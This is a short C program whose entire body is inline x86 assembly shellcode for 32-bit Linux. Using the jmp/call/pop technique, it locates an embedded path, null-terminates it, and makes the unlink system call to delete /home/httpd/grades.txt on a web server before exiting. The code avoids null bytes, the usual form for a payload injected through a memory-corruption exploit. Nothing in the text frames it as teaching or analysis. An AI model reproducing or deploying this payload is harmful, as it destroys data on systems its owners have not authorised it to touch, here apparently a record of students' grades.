void main(){
__asm__("jmp	calladdr;"
"popladdr: popl	%esi;"
"	xorl	%eax,%eax;"
"	movb	%al,(22)(%esi);"
"	movb	$9,%al;"
"       inc     %eax;"
"	movl	%esi,%ebx;"
"	int	$0x80;"
"	xorl	%ebx,%ebx;"
"	movl	%ebx,%eax;"
"	inc	%eax;"
"	int	$0x80;"
"calladdr:	call	popladdr;"
"	.ascii	\"/home/httpd/grades.txt\";"
);
}
